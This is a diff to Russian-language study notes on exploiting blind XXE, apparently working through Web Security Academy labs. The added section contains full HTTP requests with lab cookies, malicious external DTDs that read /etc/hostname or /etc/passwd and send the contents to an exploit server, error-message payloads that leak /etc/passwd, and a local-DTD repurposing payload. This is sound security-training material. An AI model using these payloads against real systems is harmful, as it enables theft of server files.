@@ -291,8 +291,146 @@ http://web-attacker.com/malicious.dtd
 
 > [!warning] ВАЖНО!
 > Этот прием может не сработать с некоторыми типами содержимого файлов, включая символы новой строки, присутствующие в `/etc/passwd` Это потому что некоторые XML парсеры получают URL во внешней сущности через API, который валидирует допустимые символы URL. В такой ситуации можно попробовать использовать протокол FTP, вместо HTTP, иногда эксфильтрация данных содержащих символы новой строки невозможна и тогда можно нацелиться на файл `/etc/hostname`
+## Пример Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD 
+По примеру выше мы должны получить файл `/etc/hostname`, для этого нам необходимо указать ссылку на внешнюю часть сущность, указав внутри нее XML код который будет выполнять уже то что нужно нам, в итоге получаем 
+```HTTP
+POST /product/stock HTTP/2
+Host: 0a3d0076032780a1aa7aac7800af0006.web-security-academy.net
+Cookie: session=pGcwleI5D7kVAn4eexvmKSLfLQHHjzlV
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a3d0076032780a1aa7aac7800af0006.web-security-academy.net/product?productId=1
+Content-Type: application/xml
+Content-Length: 230
+Origin: https://0a3d0076032780a1aa7aac7800af0006.web-security-academy.net
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
 
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0abd004b03388029aa35ab8701a700c5.exploit-server.net/exploit"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
 
+Вызывает исполнение внешней сущности на сервере который был предоставлен для лабораторной работы, внутри сервера указываем следующее Body 
 
+```
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0abd004b03388029aa35ab8701a700c5.exploit-server.net/exploit/?x=%file;'>">
+%eval;
+%exfil;
+```
+
+В результате исполнения этой внешней сущности, на наш сервер придет запрос с обращением к этому же серверу и получим что то вот такое: 
+
+![[Pasted image 20260322184127.png]]
+
+где в качестве значения параметра будет лежать наш hostname
 
 ## Эксплуатация слепой XXE для извлечения данных через сообщения об ошибках
+Альтернативный подход к эксплуатации слепой XXE это вызвать ошибку парсинга XML при которой сообщение об ошибке содержит интересующие нас конфиденциальные данные. Это эффективно если приложение возвращает получившиеся сообщение об ошибке в своем ответе
+
+Мы можем вызвать сообщение об ошибке парсинга XML содержащее содержимое файла `/etc/passwd` с помощью следующего вредоносного внешнего DTD:
+
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &\#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+Этот DTD выполняет следующие шаги 
+
+Определяет параметрическую сущность XML `file`, содержащую файл `/etc/passwd`
+Определяет параметрическую сущность XML `eval`, которая содержит динамическое объявление другой параметрической сущности `error`, и сущность `error` будет вычислена путем загрузки несуществующего файла, имя которого содержит значение сущности `file`
+Используется сущность `eval`что приводит к динамическому объявлению сущности `error`
+Используется сущность `error` из за чего ее значение вычисляется попыткой загрузить несуществующий файл, что приводит к сообщению об ошибке, содержащее имя несуществующего файла то есть содержимое `/etc/passwd`
+
+Вызов внешнего вредоносного DTD приведет к сообщению об ошибке примерно следующего вида: 
+```
+java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+```
+
+## Пример Lab: Exploiting blind XXE to retrieve data via error messages
+В лабораторной работе необходимо вытащить информацию через ошибку, для этого воспользуемся, следующим запросом через внешнюю сущность 
+
+```HTTP
+POST /product/stock HTTP/2
+Host: 0a7900a303cf980e816a9d4d00dd0059.web-security-academy.net
+Cookie: session=SWqH7P1X5VIxPqvYysW2ahL1UBQAC8S9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a7900a303cf980e816a9d4d00dd0059.web-security-academy.net/product?productId=1
+Content-Type: application/xml
+Content-Length: 230
+Origin: https://0a7900a303cf980e816a9d4d00dd0059.web-security-academy.net
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a2000d603cd98fe81829c42012800ef.exploit-server.net/exploit"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+
+а на нашем сервере разместим следующий payload: 
+
+```XML
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+После чего через Repeater отсылаем запрос и получаем следующий ответ 
+
+```HTTP
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 2419
+
+"XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
+...
+gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false (No such file or directory)"
+```
+
+---
+
+## Эксплуатация слепой XXE путем повторного использования локального DTD
+
+Предыдущая техника хорошо работает с внешним DTD, но обычно не работает с внутренним DTD, полностью заданным внутри элемента `DOCTYPE`, это потому что техника использует параметрическую сущность XML внутри определения другой параметрической сущности. По спецификации XML допустимо во внешних DTD но не во внутренних, потому что некоторые парсеры допускают, но многие нет
+
+Что делать со слепой XXE когда внеполосные взаимодействия заблокированы, нельзя эксфильтровать данные по внеполосному соединению и нельзя загрузить внешний DTD с удаленного сервера
+
+В такой ситуации все еще может быть возможность вызвать сообщения об ошибках, содержащие конфиденциальные данные, благодаря лазейке в спецификации XML. Если DTD документа это гибрид внутренних и внешних объявлений то внутренний DTD может переопределять сущности, объявленные во внешнем DTD, в этом случае ограничение на использование параметрической сущности внутри определения другой параметрической сущности ослабляется 
+
+Это означает что атакующий может применить технику извлечения информации с помощью сообщений об ошибках из внутреннего DTD, при условии что используемая параметрическая сущность переопределяет сущность объявленную во внешнем DTD. Разумеется если внеполосные соединения заблокированы то внешний DTD нельзя загрузить удаленно, вместо этого нужен внешний DTD файл который будет локальным для сервера приложения, по сути атака заключается в вызове DTD файла который есть на локальной файловой системе и его переиспользовании для переопределения существующей сущности так, чтобы провоцировать ошибку парсинга с утечкой конфиденциальных данных.
+
+Например предположим, что на сервере есть DTD файл по пути `/usr/local/app/schema.dtd` и в этом DTD объявлена сущность `custom_entity`, атакующий может вызвать сообщение об ошибке парсинга XML, содержащее содержимое файла `/etc/passwd` отправив гибридный DTD, вроде следующего 
+
+```
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+<!ENTITY % custom_entity '
+<!ENTITY &\#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &\#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&\#x25;eval;
+&\#x25;error;
+'>
+%local_dtd;
+]>
+```
+
+Этот DTD выполняет следующие шаги 
+
+Определяет параметрическую сущность XML `local_dtd`, содержащую содержимое внешнего DTD файла, существующего на файловой системе сервера
+Переопределяет параметрическую сущность XML `custom_entity`, уже объявленную во внешнем DTD файле. Сущность переопределяется так чтобы содержать ошибку, для генерации сообщения об ошибке с содержимым файла `/etc/passwd`
+Использует сущность `local_dtd` из за чего внешний DTD интерпретируется с учетом переопределенного значения `custom_entity`, это привод к желаемому сообщению об ошибке 
